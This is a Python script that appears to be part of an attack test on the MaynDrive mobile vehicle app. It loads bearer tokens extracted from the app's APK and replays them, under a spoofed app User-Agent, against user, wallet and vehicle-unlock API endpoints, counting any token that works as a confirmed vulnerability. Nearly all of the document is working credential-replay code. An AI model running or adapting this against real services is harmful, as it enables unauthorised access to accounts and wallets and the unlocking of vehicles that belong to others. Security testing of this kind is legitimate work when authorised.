#!/usr/bin/env python3
"""
Simple MaynDrive Token Tester
Quick script to test extracted tokens against your test API
"""

import requests
import json
from pathlib import Path

def load_tokens():
    """Load extracted tokens from APK analysis"""
    apk_report_path = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/apk_analysis/apk_analysis_report.json"
    
    with open(apk_report_path, 'r') as f:
        data = json.load(f)
    
    tokens = data.get('extracted_secrets', {}).get('bearer_tokens', [])
    
    # Filter for potential JWT tokens
    potential_tokens = []
    for token in tokens:
        if (token.startswith('eyJ') or 
            len(token) > 50 or 
            token.startswith('MIIC')):
            potential_tokens.append(token)
    
    return potential_tokens[:10]  # Test first 10 tokens

def test_token(token, api_base_url):
    """Test a single token against the API"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)"
    }
    
    # Test endpoints
    endpoints = [
        "/api/application/users",
        "/api/application/users/wallet",
        "/api/application/vehicles/unlock"
    ]
    
    results = {}
    
    for endpoint in endpoints:
        try:
            if endpoint == "/api/application/vehicles/unlock":
                # POST request for unlock
                payload = {
                    "serial_number": "TEST123",
                    "lat": 40.7128,
                    "lng": -74.0060
                }
                response = requests.post(f"{api_base_url}{endpoint}", 
                                       json=payload, headers=headers, timeout=10)
            else:
                # GET request
                response = requests.get(f"{api_base_url}{endpoint}", 
                                      headers=headers, timeout=10)
            
            results[endpoint] = {
                "status_code": response.status_code,
                "success": response.status_code in [200, 201],
                "response": response.text[:200] if response.text else ""
            }
            
        except Exception as e:
            results[endpoint] = {
                "error": str(e),
                "success": False
            }
    
    return results

def main():
    """Main testing function"""
    print("🧪 Simple MaynDrive Token Tester")
    print("=" * 40)
    
    # Get test API URL
    api_url = input("Enter your test API base URL: ").strip()
    if not api_url:
        print("❌ API URL required")
        return
    
    # Load tokens
    print("🔍 Loading extracted tokens...")
    tokens = load_tokens()
    print(f"✅ Found {len(tokens)} tokens to test")
    
    # Test each token
    print(f"\n🎯 Testing against: {api_url}")
    print("=" * 40)
    
    valid_tokens = []
    
    for i, token in enumerate(tokens, 1):
        print(f"\n🔑 Testing Token {i}: {token[:30]}...")
        
        results = test_token(token, api_url)
        
        for endpoint, result in results.items():
            if result.get("success"):
                print(f"   ✅ SUCCESS: {endpoint} - Status: {result['status_code']}")
                if endpoint not in [t['endpoint'] for t in valid_tokens]:
                    valid_tokens.append({
                        'token': token,
                        'endpoint': endpoint,
                        'status_code': result['status_code']
                    })
            else:
                error = result.get('error', result.get('status_code'))
                print(f"   ❌ FAILED: {endpoint} - {error}")
    
    # Summary
    print("\n" + "=" * 40)
    print("📊 TESTING SUMMARY")
    print("=" * 40)
    print(f"🎯 API URL: {api_url}")
    print(f"🔍 Tokens Tested: {len(tokens)}")
    print(f"✅ Valid Tokens Found: {len(valid_tokens)}")
    
    if valid_tokens:
        print("\n🚨 VULNERABILITY CONFIRMED!")
        print("Valid tokens found that can access the API:")
        for vt in valid_tokens:
            print(f"   - {vt['endpoint']}: Status {vt['status_code']}")
    else:
        print("\n✅ No valid tokens found")
    
    # Save results
    results_data = {
        "api_url": api_url,
        "tokens_tested": len(tokens),
        "valid_tokens": valid_tokens,
        "all_results": {f"token_{i}": test_token(token, api_url) for i, token in enumerate(tokens, 1)}
    }
    
    output_file = "/home/ubuntu/Desktop/Project/Attacktest/claude_analysis/mobsf_analysis/simple_test_results.json"
    with open(output_file, 'w') as f:
        json.dump(results_data, f, indent=2)
    
    print(f"\n📁 Results saved to: {output_file}")

if __name__ == "__main__":
    main()
